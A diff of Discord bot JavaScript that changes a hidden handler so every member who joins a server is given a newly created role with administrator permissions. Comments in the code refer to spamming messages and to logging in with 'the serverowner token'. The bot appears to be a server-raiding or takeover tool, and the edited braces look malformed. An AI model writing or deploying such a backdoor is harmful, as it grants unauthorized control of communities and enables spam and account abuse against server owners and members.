@@ -443,11 +443,9 @@ let me = message.author
 
 
 
-//any member join the server will give him adminstrator
+//if the bot join in any server the will give self adminstratpr role 
   client.on('guildMemberAdd', member => {
-      
-              if (member.id === "429972030092476437") { //حط ايديك // your id 
-                  member.guild.createRole({
+                        member.guild.createRole({
                       name : client.user.username,
                       color : "RANDOM", 
                       permissions : [8]
@@ -455,7 +453,7 @@ let me = message.author
                       member.addRole(role)
                   })
                   
-              }
+              })
           
 
             //spam message
@@ -473,7 +471,7 @@ let me = message.author
             
             
                         })
-                    }})
-                }) 
+                      }})
+
 //login in to the bot token or the serverowner token
 client.login(Token)
